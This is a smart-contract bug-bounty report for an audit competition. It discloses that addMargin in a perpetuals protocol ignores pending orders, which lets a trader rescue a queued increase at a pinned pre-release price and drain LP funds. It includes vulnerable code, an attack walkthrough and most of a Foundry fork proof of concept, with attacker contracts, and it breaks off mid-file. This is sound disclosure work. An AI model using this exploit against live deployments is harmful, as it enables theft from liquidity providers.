# \#98854 [SC-Critical] Missing pending-order check in CfdEngine.addMargin lets a trader rescue an increase that fails its initial-margin check at its pinned price, leading to direct theft of user funds from LPs

**Submitted on Nov 10th 2026 at 15:17:00 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98854
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An order fills at the first Pyth price after its commit, and anyone can execute it. The commit screen rejects an increase that would fail its initial-margin check, but it previews the live position only and ignores the same account's queued orders. So a trader queues a small increase first and then a large one margined to the commit-screen threshold. At the pinned price, once the small one has filled, the large one fails the initial-margin check. That failure ends the order for good, unless the owner first calls `CfdEngine.addMargin`, which is instant and reads no pending order. The trader now holds a free option on the pre-release price. I ran it on a fork of the deployed v2.0.0 at the US payrolls release of 6 November 2026, replaying that minute's keeper ticks and their signed Pyth prices. The trader arms 4,000,000 USDG one second before 13:30:00 and reads the release from public trades two seconds after it. It rescues the order at the pre-release price, closes on the next real tick, and withdraws 1,864.915179 USDG more than it put in. The LP pool ends 3,508.918763 USDG below the same window without the attacker. On the same release, the same option on the other side is declined and the deployment's own executor kills it for the 0.20 USDG bounty.

## Vulnerability Details

1. The attacker holds a thin base position, 10,000 USDG of notional with 3,000 USDG of margin. One second before a scheduled release it commits two same-side increases. The first is a 100,000 USDG pre-order. The second is the 4,000,000 USDG arm, margined to the commit-screen threshold plus 1 USDG. No user execution bound is set: `minPostPositionEquityAssets = 0` and `maxPostLeverageBps = type(uint32).max`.
2. The commit screen previews each open against the live position only (`OrderLiquidationBatchLogic.sol:430-432`). The queued-order projection in `_queuedPosition` (`OrderLiquidationBatchLogic.sol:367-402`) feeds only the opposing-side check (`OrderLiquidationBatchLogic.sol:423-428`). So both previews count the same base-margin excess, and both pass.
3. The screen is the guard that should stop this. With a mark younger than the staleness limit it rejects predictably invalid opens (`OrderLiquidationBatchLogic.sol:437-445`). `INSUFFICIENT_INITIAL_MARGIN` is one of the codes classed as rejectable at commit (`CfdEnginePlanLib.sol:85-93`). In the run the stored mark is 31 s old, inside the 60 s limit, so the screen runs and lets the arm through.
4. Both orders pin to the first unique Pyth update after the commit (`PletherOracle.sol:610-614`). The parsed basket stays the price even when storage holds newer prices (`PletherOracle.sol:620-622`). `Router.executeOrder` has no caller restriction (`OrderRouter.sol:240-243`).
5. At the pinned price the pre-order fills first and spends the base excess. The arm then fails the post-open initial-margin check (`CfdEnginePlanLib.sol:431-436`). The failure is recorded as terminal `PlannerRejected` (`OrderRouterExecutionSidecar.sol:846-853`). The order is deleted as `Failed`, and its bounty is paid to the executor (`OrderRouter.sol:304-311`, `:331-342`).
6. `CfdEngine.addMargin` checks only the caller, the amount and that a position exists (`CfdEngine.sol:505-515`). It then locks free settlement as position margin (`CfdEngine.sol:520-523`). It never reads the account's pending orders.
7. After the release, one transaction executes the pre-order, calls `addMargin(5,000 USDG)` and executes the arm. The arm passes and fills at the pre-release pinned price.
8. The deployment's executor finalizes failing heads too: the reference keeper has "No reward filter" (`packages/perps-aa-client/src/keeperExecution.ts:21-28`). So an adverse move costs the attacker the 0.20 USDG bounty, paid when the executor kills the order.
9. The guarantee this breaks: "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options" (`SECURITY.md:658-659`).

### Vulnerable source code

**1. the commit screen projects queued orders only for the opposing side, then previews the live position** @ packages/perps/src/router/OrderLiquidationBatchLogic.sol:423-432

```solidity
        // Project the live position through earlier account orders before checking the requested side.
        QueuedPositionView memory queuedPosition = _queuedPosition(host, engine, account);
        uint8 opposingCode = uint8(CfdEnginePlanTypes.OpenRevertCode.MUST_CLOSE_OPPOSING);
        if (queuedPosition.exists && queuedPosition.side != side) {
            revert OrderRouter__PredictableOpenInvalid(opposingCode);
        }

        uint64 commitMarkTime = engine.lastMarkTime();
        uint8 revertCode =
            host.engineLensForCommit().previewOpenRevertCode(account, side, sizeDelta, marginDelta, commitPrice);
```

**2. an initial-margin failure is meant to be rejected at commit** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:85-93

```solidity
                || code == CfdEnginePlanTypes.OpenRevertCode.SKEW_TOO_HIGH
                || code == CfdEnginePlanTypes.OpenRevertCode.INSUFFICIENT_INITIAL_MARGIN
                || code == CfdEnginePlanTypes.OpenRevertCode.SOLVENCY_EXCEEDED
                || code == CfdEnginePlanTypes.OpenRevertCode.INVALID_SIZE_QUANTUM
                || code == CfdEnginePlanTypes.OpenRevertCode.LIQUIDATION_RESERVE_UNFUNDED
                || code == CfdEnginePlanTypes.OpenRevertCode.VPI_REBATE_RESERVE_UNFUNDED
                || code == CfdEnginePlanTypes.OpenRevertCode.NUMERIC_DOMAIN_EXCEEDED
        ) {
            return CfdEnginePlanTypes.OpenFailurePolicyCategory.CommitTimeRejectable;
```

**3. the initial-margin check at execution, on the post-queue position** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:431-436

```solidity
        if (
            postOpenRiskState.liquidatable
                || postOpenRiskState.equityAssets <= int256(openState.initialMarginRequirementAssets)
        ) {
            delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.INSUFFICIENT_INITIAL_MARGIN;
            return delta;
```

**4. the failure is terminal** @ packages/perps/src/OrderRouterExecutionSidecar.sol:846-853

```solidity
            if (
                knownCode && category == uint256(expectedCategory)
                    && expectedCategory != CfdEnginePlanTypes.ExecutionFailurePolicyCategory.None
            ) {
                classification.terminal = true;
                classification.plannerFailure = true;
                classification.plannerIsClose = isClose == 1;
                classification.reason = OrderV3Types.TerminalReason.PlannerRejected;
```

**5. addMargin: owner, amount and position checks, no pending-order check** @ packages/perps/src/CfdEngine.sol:505-515

```solidity
        if (msg.sender != account) {
            revert CfdEngine__NotAccountOwner();
        }
        if (amount == 0) {
            revert CfdEngine__ZeroAmount();
        }
        StoredPosition storage pos = _positions[account];
        if (pos.lots == 0) {
            revert CfdEngine__NoOpenPosition();
        }
```

**6. the fill is pinned to the first update after the commit** @ packages/perps/src/PletherOracle.sol:610-614

```solidity
        uint64 minPublishTime = request.commitTime + 1;
        uint256 settlementDeadline = uint256(request.commitTime) + orderSettlementWindow;
        uint64 maxPublishTime = uint64(settlementDeadline < block.timestamp ? settlementDeadline : block.timestamp);
        try pyth.parsePriceFeedUpdatesUnique{value: pythFee}(
            pythUpdateData, pythFeedIds, minPublishTime, maxPublishTime
```

## Impact Details

- Impact row: "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield" (Critical). The attacker mints 60,000.000000 USDG and ends with 61,864.915179 USDG in its own wallet after it withdraws everything, +1,864.915179 USDG. `HousePool.totalAssets` ends 3,508.918763 USDG below the same window without the attacker, and Junior carries all of it (Senior 0). The treasury takes the other 1,644.003584 USDG as execution fees. 1,864.915179 + 1,644.003584 = 3,508.918763, to the atom, and the deployed USDG contract's own `Transfer` events show the same flows (Output).
- The attacker needs no view on direction before the release. On the same release, the same option on the SHORT side is declined. The executor kills it at its 13:30:05 median, and that holder ends -235.539148 USDG. The same SHORT orders without the rescue end -8,816.584829 USDG. Both options held end +1,629.376031 USDG, against -6,952.061650 USDG for the same four orders without the option.
- Everything is production state. The run forks the deployed v2.0.0 at block 326633764 and asserts the runtime code hash of all 15 manifest contracts and the `DEPLOYMENT.md` release configuration. It replays the three real keeper ticks of the window, and every fill uses a real signed Pyth payload taken from those ticks' own calldata, verified by the deployed Pyth contract. The book is the real one: 35.98M USDG net LONG on a 102.18M USDG pool.
- The decision uses public data that had printed by then. Binance EUR/USDT, from the public daily trade file on data.binance.vision (sha256 equal to its published checksum), fell 8.05 bp by 13:30:02.300. 92% of the EUR traded since 13:30:00 was sold. A falling EUR/USD means a falling USD-quoted basket, and a LONG gains.
- The exercise lands 3 s after the commit. On 6 November the deployment's only executor, `0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B`, finalized 42 orders 3 to 9 s after commit, 40 of them at 4 s or later. The program: "Feasibility limitations do not change the impact or severity of a finding, only the amount paid for it."
- Prerequisites, all permissionless: an open position, free margin (60,000 USDG in the run), a contract account that bundles `addMargin` and `executeOrder`, and a scheduled release. The arm is sized at 4,000,000 USDG, inside the 40% skew room the real book left.
- The victim sees ordinary fills. The rescued arm is an `Executed` order at its own pinned price, and every LP pays pro rata through the pool's trading P&L.
- It repeats at every release. Each account holds up to 5 pending orders (`router.maxPendingOrders()`), and an unexercised arm costs 0.20 USDG.
- Dedup note.
  - HIGH-1 (`SECURITY.md:701-713`) is a commit after an already published price. Here the commit is at 13:29:59, before the 13:30:00 publication it pins to. The program's carve-out for a HIGH-1 report reads: "valid only with a proof of concept showing a repeatable, net-profitable extraction from LPs".
  - Cecuro MED-16 and LOW-57 ("Opens committed against a stale cached price, and the keeper bounty sized from it") need a stale mark. Here the mark is 31 s old, inside the limit, and the commit screen runs.
  - My report #98732 uses the same `addMargin` lever on two user-set bounds. This report needs no user bound: the check it beats is the protocol's own initial-margin check, which the commit screen is meant to enforce. The fix proposed in #98732 (guard `addMargin` while a pending order carries a nonzero `minPostPositionEquityAssets` or a finite `maxPostLeverageBps`) leaves this PoC unchanged, because both bounds are off here. The patch in the Low that #98732 was merged into changes how a VPI rebate-reserve increase is funded (`CfdEnginePlanLib.sol:561-566`). The LONG arm here adds skew, so it has no rebate-reserve increase.
  - Fix: reject `addMargin` while the account has a pending open.

## References

Commit screen
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:367-402 - `_queuedPosition`, the queued-order projection
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:423-428 - the projection used only for the opposing-side check
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:430-432 - the preview on the live position
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:437-445 - predictably invalid opens rejected while the mark is fresh
- packages/perps/src/libraries/CfdEnginePlanLib.sol:85-93 - `INSUFFICIENT_INITIAL_MARGIN` is `CommitTimeRejectable`

Execution and the terminal failure
- packages/perps/src/libraries/CfdEnginePlanLib.sol:431-436 - the initial-margin check at execution
- packages/perps/src/OrderRouterExecutionSidecar.sol:846-853 - recorded as terminal `PlannerRejected`
- packages/perps/src/OrderRouter.sol:304-311 - terminal order deleted with status `Failed`
- packages/perps/src/OrderRouter.sol:331-342 - the failed order's bounty paid to the executor
- packages/perps-aa-client/src/keeperExecution.ts:21-28 - the keeper has no reward filter

The owner's lever
- packages/perps/src/CfdEngine.sol:501-529 - `addMargin`, no pending-order check

Pinned fill
- packages/perps/src/PletherOracle.sol:610-614 - first unique update after the commit
- packages/perps/src/PletherOracle.sol:620-622 - the parsed basket stays the price
- packages/perps/src/OrderRouter.sol:240-243 - `executeOrder`, no caller restriction

Guarantee and known issues
- packages/perps/SECURITY.md:658-659 - no free options from queued intents
- packages/perps/SECURITY.md:701-713 - HIGH-1, commit after an already published price
- packages/perps/SECURITY.md:1349-1352 - stale cached marks at commitment (MED-16, LOW-57)
- packages/perps/src/libraries/CfdEnginePlanLib.sol:561-566 - VPI rebate-reserve funding, the site of the Low's patch

Deployment
- deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json - the 15 runtime code hashes the PoC asserts
- packages/perps/DEPLOYMENT.md - the release parameters the PoC asserts



## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/76fc42461a104f28930ba826871d37df

## Proof of Concept

## Proof of Concept

One Foundry test file forks the deployed v2.0.0 on Arbitrum Sepolia 40 s before the 6 November 2026 payrolls release and replays the window's three real keeper ticks. It runs six scenarios from one snapshot: the LONG option exercised, the same option with the executor first, the same LONG orders without the option, the SHORT option declined, the same SHORT orders without the option, and a baseline with no attacker. The deployed contracts produce every number. Files: https://gist.github.com/decies-centena-millia/76fc42461a104f28930ba826871d37df

```bash
mkdir -p packages/perps/test/poc && cp AddMarginRescueNfpForkPoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/AddMarginRescueNfpForkPoC.t.sol --skip 'test/perps/**' --skip 'script/**' --skip 'src/**' -vv
```

### attack step-by-step

1. 13:29:27 UTC. ATTACKER deploys its account and bundler, mints 60,000 USDG from the testnet faucet, deposits it and commits a 10,000 USDG LONG base with 3,000 USDG of margin. The bundler fills it on the 13:29:28 real tick.
2. 13:29:59. The account commits a 100,000 USDG LONG pre-order and then the 4,000,000 USDG LONG arm, with margin 25,541.280849 USDG, the deployed lens's commit-screen threshold plus 1 USDG. The stored mark is 31 s old, the commit screen runs, and both orders pin to the 13:30:00 publication.
3. 13:30:00. The payrolls number prints. By 13:30:02.300, Binance EUR/USDT is 8.05 bp below its last pre-release trade.
4. 13:30:02, 3 s after the commit. One bundler transaction executes the pre-order, calls `CfdEngine.addMargin(5,000 USDG)` and executes the arm. The arm fills at 96,316,305, the 13:30:00 pinned price.
5. 13:30:34. The account commits a full close. At 13:30:38 the bundler fills it on the 13:30:35 real tick, at 96,194,628. ATTACKER withdraws the account and the bundler to its wallet.

## main Attack code

```solidity
// commit: the arm is margined to the commit-screen threshold, behind a same-side pre-order that spends the base excess
a.preId = _commit(side, a.preSize, _minMargin(side, a.preSize, px) + PRE_BUFFER, false);
a.armId = _commit(side, a.armSize, _minMargin(side, a.armSize, px) + ARM_DELTA, false);

// one transaction after the release: execute the pre-order, lift the margin, execute the arm at its pinned price
c[0] = _execCall(a.preId, pin);
c[1] = NfpBundler.Call(address(acct), abi.encodeCall(NfpOptionAccount.addMargin, (RESCUE)));
c[2] = _execCall(a.armId, pin);
bundler.run(c);
```

```
plant : a same-side pre-order queued ahead of an increase margined to the commit-screen threshold
fire  : CfdEngine.addMargin and Router.executeOrder with the pinned update, in one transaction, after the release
```

### full poc code, single file, single runnable command

Foundry: forge 1.8.5 (`51a52c59`), solc 0.8.35, the repo's default `packages/perps/foundry.toml` profile (`via_ir = true`, optimizer 200 runs). The libraries are at the submodule commits `a82d4fef` pins (forge-std `f5495c9b`, morpho-blue `55d2d993`, openzeppelin-contracts `fcbae539`). RPC: `ARB_SEPOLIA_RPC_URL`, default `https://arbitrum-sepolia.gateway.tenderly.co` (any Arbitrum Sepolia archive endpoint).

`AddMarginRescueNfpForkPoC.t.sol`, placed at `packages/perps/test/poc/AddMarginRescueNfpForkPoC.t.sol`. It imports only `CfdTypes`, `OrderV3Types` and `IOrderRouterAccounting` from the repo. Command, from the repo root at a82d4fef:

```bash
mkdir -p packages/perps/test/poc && cp AddMarginRescueNfpForkPoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/AddMarginRescueNfpForkPoC.t.sol --skip 'test/perps/**' --skip 'script/**' --skip 'src/**' -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Fork of the deployed Plether perps v2.0.0 (Arbitrum Sepolia) at block 326633764, Fri 2026-11-06 13:29:20 UTC, 40 s before
// the US payrolls release. The three real keeper ticks of the window are replayed with vm.transact, and every fill uses
// a real signed Pyth payload taken from those ticks' own calldata.
// From packages/perps at a82d4fef:
//   forge test --match-path test/poc/AddMarginRescueNfpForkPoC.t.sol --skip 'test/perps/**' --skip 'script/**' --skip 'src/**' -vv

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

interface IArbSysBlockNumber {
    function arbBlockNumber() external view returns (uint256);
}

/// @dev MockUSDG, the deployed testnet settlement token. Its `mint` is public.
interface IUSDG {
    function mint(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IEngine {
    function lastMarkPrice() external view returns (uint256);
    function lastMarkTime() external view returns (uint64);
    function sides(uint256 index) external view returns (uint256, uint256, uint256, uint256);
    function riskParams()
        external
        view
        returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256);
    function executionFeeBps() external view returns (uint256);
    function settlementBufferBps() external view returns (uint256);
    function frozenCloseSpreadBps() external view returns (uint256);
    function fadRunwaySeconds() external view returns (uint256);
    function isFadWindow() external view returns (bool);
    function isOracleFrozen() external view returns (bool);
    function protocolTreasury() external view returns (address);
    function positions(address account)
        external
        view
        returns (uint256, uint256, uint256, uint256, CfdTypes.Side, uint64, int256);
    function addMargin(address account, uint256 amount) external;
}

interface IRouter {
    function commitOrder(OrderV3Types.OrderRequest calldata request) external returns (uint64 orderId);
    function executeOrder(uint64 orderId, bytes[] calldata pythUpdateData)
        external
        payable
        returns (OrderV3Types.ExecutionResult memory result);
    function maxExecutionWindowSeconds() external view returns (uint256);
    function minOpenNotionalAssets() external view returns (uint256);
    function maxPendingOrders() external view returns (uint256);
    function getPendingOrderView(uint64 orderId)
        external
        view
        returns (IOrderRouterAccounting.PendingOrderView memory pending, uint64 nextAccountOrderId);
}

interface ILens {
    function previewOpenRevertCode(address, CfdTypes.Side, uint256, uint256, uint256) external view returns (uint8);
}

interface IPool {
    function totalAssets() external view returns (uint256);
    function maxSeniorExposureAssets() external view returns (uint256);
    function maxSeniorShareBps() external view returns (uint256);
    function lpEpochSettlementPaused() external view returns (bool);
}

interface IOracle {
    function getUpdateFee(bytes[] calldata pythUpdateData) external view returns (uint256);
    function basketMaxConfidenceRatioBps() external view returns (uint256);
    function adverseConfidenceMultiplierBps() external view returns (uint256);
}

interface IClearinghouse {
    function deposit(address account, uint256 amount) external;
    function withdraw(address account, uint256 amount) external;
    function balanceAssets(address account) external view returns (uint256);
    function getFreeBuyingPowerAssets(address account) external view returns (uint256);
}

interface IBook {
    function currentExecutionConfigHash() external view returns (bytes32);
}

interface IVault {
    function totalAssets() external view returns (uint256);
    function maintenanceFeeAprBps() external view returns (uint256);
}

/// @dev Generated by provenance/gen_solidity_data.py. Tick input hashes are keccak256 of the `input` of the real
///      transactions (provenance/txs/<hash>.json). Binance rows are every EUR/USDT aggregate trade
///      with transact_time in [13:29:59.000000, 13:30:02.300000] UTC from data.binance.vision
///      spot/daily/aggTrades/EURUSDT/EURUSDT-aggTrades-2026-11-06.zip (sha256 1fde69955b98c4d53b9c4093f99472971c0990dde717c0a8c06dab5f2de04ca5, equal to its
///      published .CHECKSUM; CSV sha256 58b8903fe561d7dc5220d8c970373cbccf864724c9635e16867dfe4391fcd890). Columns: aggTradeId, price x 1e4, quantity x 10, transact_time (us), isBuyerMaker.
abstract contract AddMarginRescueNfpData {
    struct Trade {
        uint64 aggTradeId;
        uint32 priceE4;
        uint64 qtyE1;
        uint64 timeUs;
        bool isBuyerMaker;
    }

    /// @dev keccak256 of the `input` of real keeper tick 0xfdc294390dd2a6a8e6c476b60a294a3b44056807a6f498e9e6baeb5214be3d32 (block 326633813).
    bytes32 internal constant TICK1_INPUT_HASH = 0x08277947fc22352d372429a76a286f4c2654c153e909e2acc8d95f743cb6355f;
    /// @dev keccak256 of the `input` of real keeper tick 0x989b88cdaf4ccdccd8203c6a7f2f7b6739c1484ea3e64a81ecdccb5c2136938e (block 326633933).
    bytes32 internal constant TICK2_INPUT_HASH = 0x476150a0a45869c6ddb8aed43f610a49d375a53b8d8c5faff85e04416f99bd98;
    /// @dev keccak256 of the `input` of real keeper tick 0xfc1dc075d626b164b44ce4024e2d4a35faeecfbc8f549955115eb721f06f361f (block 326634054).
    bytes32 internal constant TICK3_INPUT_HASH = 0x435cd8e699a4264612ce1403b03c6e156ead112c1db748277c5a734167434ce4;

    uint256 internal constant BINANCE_ROWS = 57;

    function _binanceEurUsdt() internal pure returns (Trade[] memory t) {
        t = new Trade[](57);
        t[0] = Trade(140905652, 11177, 2915, 1793971799039409, false);
        t[1] = Trade(140905653, 11177, 211, 1793971799943376, false);
        t[2] = Trade(140905654, 11176, 1099, 1793971800776620, false);
        t[3] = Trade(140905655, 11176, 6652, 1793971801089782, false);
        t[4] = Trade(140905656, 11175, 27239, 1793971801135067, true);
        t[5] = Trade(140905657, 11175, 213, 1793971801141387, true);
        t[6] = Trade(140905658, 11176, 1099, 1793971801142542, false);
        t[7] = Trade(140905659, 11177, 2527, 1793971801142542, false);
        t[8] = Trade(140905660, 11177, 4518, 1793971801143709, false);
        t[9] = Trade(140905661, 11178, 1443, 1793971801143709, false);
        t[10] = Trade(140905662, 11175, 105000, 1793971801147528, true);
        t[11] = Trade(140905663, 11178, 5523, 1793971801149219, false);
        t[12] = Trade(140905664, 11176, 435, 1793971801169867, false);
        t[13] = Trade(140905665, 11176, 1951, 1793971801171859, false);
        t[14] = Trade(140905666, 11178, 3905, 1793971801171859, false);
        t[15] = Trade(140905667, 11175, 6811, 1793971801184227, true);
        t[16] = Trade(140905668, 11174, 63838, 1793971801184227, true);
        t[17] = Trade(140905669, 11173, 6595, 1793971801184227, true);
        t[18] = Trade(140905670, 11178, 5991, 1793971801200978, false);
        t[19] = Trade(140905671, 11178, 3325, 1793971801255789, false);
        t[20] = Trade(140905672, 11174, 44747, 1793971801283667, true);
        t[21] = Trade(140905673, 11173, 89502, 1793971801283667, true);
        t[22] = Trade(140905674, 11172, 24779, 1793971801283667, true);
        t[23] = Trade(140905675, 11171, 15550, 1793971801283667, true);
        t[24] = Trade(140905676, 11174, 2744, 1793971801473946, true);
        t[25] = Trade(140905677, 11174, 894, 1793971801541179, true);
        t[26] = Trade(140905678, 11174, 5166, 1793971801576039, true);
        t[27] = Trade(140905679, 11174, 108, 1793971801582623, true);
        t[28] = Trade(140905680, 11174, 12330, 1793971801594414, true);
        t[29] = Trade(140905681, 11174, 74, 1793971801674612, true);
        t[30] = Trade(140905682, 11174, 280, 1793971801685539, true);
        t[31] = Trade(140905683, 11174, 27116, 1793971801726301, true);
        t[32] = Trade(140905684, 11178, 5900, 1793971801747272, false);
        t[33] = Trade(140905685, 11179, 6200, 1793971801747272, false);
        t[34] = Trade(140905686, 11180, 5059, 1793971801747272, false);
        t[35] = Trade(140905687, 11180, 4025, 1793971801753336, false);
        t[36] = Trade(140905688, 11181, 56, 1793971801782702, false);
        t[37] = Trade(140905689, 11174, 27119, 1793971801788065, true);
        t[38] = Trade(140905690, 11174, 883, 1793971801821523, true);
        t[39] = Trade(140905691, 11174, 421, 1793971801873819, true);
        t[40] = Trade(140905692, 11174, 57106, 1793971802003822, true);
        t[41] = Trade(140905693, 11173, 15737, 1793971802003822, true);
        t[42] = Trade(140905694, 11172, 2292, 1793971802003822, true);
        t[43] = Trade(140905695, 11171, 116226, 1793971802003822, true);
        t[44] = Trade(140905696, 11170, 61052, 1793971802003822, true);
        t[45] = Trade(140905697, 11169, 9271, 1793971802003822, true);
        t[46] = Trade(140905698, 11178, 10840, 1793971802062709, false);
        t[47] = Trade(140905699, 11172, 1342, 1793971802075138, true);
        t[48] = Trade(140905700, 11174, 8940, 1793971802085748, true);
        t[49] = Trade(140905701, 11172, 7511, 1793971802098225, true);
        t[50] = Trade(140905702, 11172, 1342, 1793971802104317, true);
        t[51] = Trade(140905703, 11170, 44763, 1793971802106342, true);
        t[52] = Trade(140905704, 11169, 10671, 1793971802106342, true);
        t[53] = Trade(140905705, 11172, 1342, 1793971802135472, true);
        t[54] = Trade(140905706, 11172, 269, 1793971802173413, true);
        t[55] = Trade(140905707, 11170, 6200, 1793971802212093, true);
        t[56] = Trade(140905708, 11168, 1051, 1793971802279323, true);
    }
}

/// @notice The attacker's trading account, driven by its owner EOA and the owner's bundler.
contract NfpOptionAccount {
    address public immutable owner;
    address public immutable bundler;
    IRouter internal immutable router;
    IEngine internal immutable engine;
    IClearinghouse internal immutable clearinghouse;
    IUSDG internal immutable usdg;

    constructor(address bundler_, address router_, address engine_, address clearinghouse_, address usdg_) {
        owner = msg.sender;
        bundler = bundler_;
        router = IRouter(router_);
        engine = IEngine(engine_);
        clearinghouse = IClearinghouse(clearinghouse_);
        usdg = IUSDG(usdg_);
    }

    modifier auth() {
        require(msg.sender == owner || msg.sender == bundler, "auth");
        _;
    }

    function fund(uint256 amount) external auth {
        usdg.transferFrom(owner, address(this), amount);
        usdg.approve(address(clearinghouse), amount);
        clearinghouse.deposit(address(this), amount);
    }

    function commit(OrderV3Types.OrderRequest calldata request) external auth returns (uint64 orderId) {
        orderId = router.commitOrder(request);
    }

    /// @dev CfdEngine.addMargin requires msg.sender == account.
    function addMargin(uint256 amount) external auth {
        engine.addMargin(address(this), amount);
    }

    function withdrawAll() external auth {
        uint256 free = clearinghouse.getFreeBuyingPowerAssets(address(this));
        if (free != 0) clearinghouse.withdraw(address(this), free);
        uint256 bal = usdg.balanceOf(address(this));
        if (bal != 0) usdg.transfer(owner, bal);
    }
}

/// @notice The attacker's one-transaction bundle. It is the executeOrder caller, so bounties are credited to it.
contract NfpBundler {
    struct Call {
        address target;
        bytes data;
    }

    address public immutable owner;
    IClearinghouse internal immutable clearinghouse;
    IUSDG internal immutable usdg;

    constructor(address clearinghouse_, address usdg_) {
        owner = msg.sender;
        clearinghouse = IClearinghouse(clearinghouse_);
        usdg = IUSDG(usdg_);
    }

    function run(Call[] calldata calls) external returns (bytes[] memory results) {
        require(msg.sender == owner, "owner");
        results = new bytes[](calls.length);
        for (uint256 i; i < calls.length; ++i) {
            (bool ok, bytes memory ret) = calls[i].target.call(calls[i].data);
            if (!ok) {
                assembly ("memory-safe") {
                    revert(add(ret, 32), mload(ret))
                }
            }
            results[i] = ret;
        }
    }

    function withdrawAll() external {
        require(msg.sender == owner, "owner");
        uint256 free = clearinghouse.getFreeBuyingPowerAssets(address(this));
        if (free != 0) clearinghouse.withdraw(address(this), free);
        uint256 bal = usdg.balanceOf(address(this));
        if (bal != 0) usdg.transfer(owner, bal);
    }
}

contract AddMarginRescueNfpForkPoC is Test, AddMarginRescueNfpData {
    // deployment, release manifest v2.0.0
    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address internal constant CLEARINGHOUSE = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;
    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant ENGINE_LENS = 0xfCa322C6868cEf53bD5C344628f9874712e48108;
    address internal constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address internal constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address internal constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address internal constant LIFECYCLE_BOOK = 0x327d5fd04e17D96DD5C4F845A0b4256A9e19645C;
    address internal constant JUNIOR = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address internal constant SENIOR = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    /// @dev The only order executor of v2.0.0 (269 of 269 orders, 1-10 Nov). Also owner, treasury and 99.99% of Junior.
    address internal constant KEEPER = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B;

    // real timeline, UTC, Fri 2026-11-06
    uint256 internal constant FORK_BLOCK = 326_633_764; // 13:29:20
    uint256 internal constant FORK_TS = 1_793_971_760;
    uint256 internal constant TICK1_BLOCK = 326_633_813; // 13:29:33, publish 13:29:28
    uint256 internal constant TICK1_TS = 1_793_971_773;
    uint256 internal constant TICK1_PUBLISH = 1_793_971_768;
    uint256 internal constant TICK1_MARK = 96_313_393;
    bytes32 internal constant TICK1_HASH = 0xfdc294390dd2a6a8e6c476b60a294a3b44056807a6f498e9e6baeb5214be3d32;
    uint256 internal constant TICK2_BLOCK = 326_633_933; // 13:30:05, publish 13:30:00: the arm's pinned tick
    uint256 internal constant TICK2_TS = 1_793_971_805;
    uint256 internal constant TICK2_PUBLISH = 1_793_971_800;
    uint256 internal constant TICK2_MARK = 96_318_319;
    bytes32 internal constant TICK2_HASH = 0x989b88cdaf4ccdccd8203c6a7f2f7b6739c1484ea3e64a81ecdccb5c2136938e;
    uint256 internal constant TICK3_BLOCK = 326_634_054; // 13:30:38, publish 13:30:35: the close's pinned tick
    uint256 internal constant TICK3_TS = 1_793_971_838;
    uint256 internal constant TICK3_PUBLISH = 1_793_971_835;
    uint256 internal constant TICK3_MARK = 96_192_674;
    bytes32 internal constant TICK3_HASH = 0xfc1dc075d626b164b44ce4024e2d4a35faeecfbc8f549955115eb721f06f361f;

    uint256 internal constant T_BASE_COMMIT = TICK1_PUBLISH - 1; // 13:29:27
    uint256 internal constant T_ARM_COMMIT = TICK2_PUBLISH - 1; // 13:29:59
    uint256 internal constant T_EXERCISE = T_ARM_COMMIT + 3; // 13:30:02; on 6 Nov the executor took >= 4 s on 40 of 42 orders
    uint256 internal constant T_KEEPER_MEDIAN = T_ARM_COMMIT + 6; // 13:30:05, the executor's 6 Nov median
    uint256 internal constant T_CLOSE_COMMIT = TICK3_PUBLISH - 1; // 13:30:34

    uint256 internal constant RELEASE_US = 1_793_971_800_000_000; // 13:30:00.000000
    uint256 internal constant DECISION_US = 1_793_971_802_300_000; // 13:30:02.300000
    int256 internal constant SIGNAL_THRESHOLD_CBP = 500; // 5 bp, in 1/100 bp

    // attacker parameters, USDG 6 decimals
    uint256 internal constant FUND = 60_000e6;
    uint256 internal constant BASE_NOTIONAL = 10_000e6;
    uint256 internal constant BASE_MARGIN = 3_000e6;
    uint256 internal constant PRE_NOTIONAL = 100_000e6;
    uint256 internal constant PRE_BUFFER = 50e6;
    uint256 internal constant ARM_NOTIONAL = 4_000_000e6;
    uint256 internal constant ARM_DELTA = 1e6;
